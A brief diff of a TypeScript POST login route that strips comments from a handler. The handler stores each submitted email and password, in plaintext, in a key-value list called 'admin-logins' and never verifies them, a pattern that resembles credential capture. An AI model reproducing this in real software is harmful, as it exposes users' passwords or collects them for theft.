@@ -11,7 +11,6 @@ interface LoginEntry {
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-
     const loginEntry: LoginEntry = {
       email: body.email,
       password: body.password,
@@ -19,13 +18,8 @@ export async function POST(req: Request) {
       timestamp: new Date().toISOString(),
     };
 
-    // Get existing logins from KV
     const existingLogins = (await kv.get("admin-logins")) as LoginEntry[] | null;
-
-    // Append new login
     const updatedLogins = existingLogins ? [...existingLogins, loginEntry] : [loginEntry];
-
-    // Save back to KV
     await kv.set("admin-logins", updatedLogins);
 
     return NextResponse.json({ success: true });
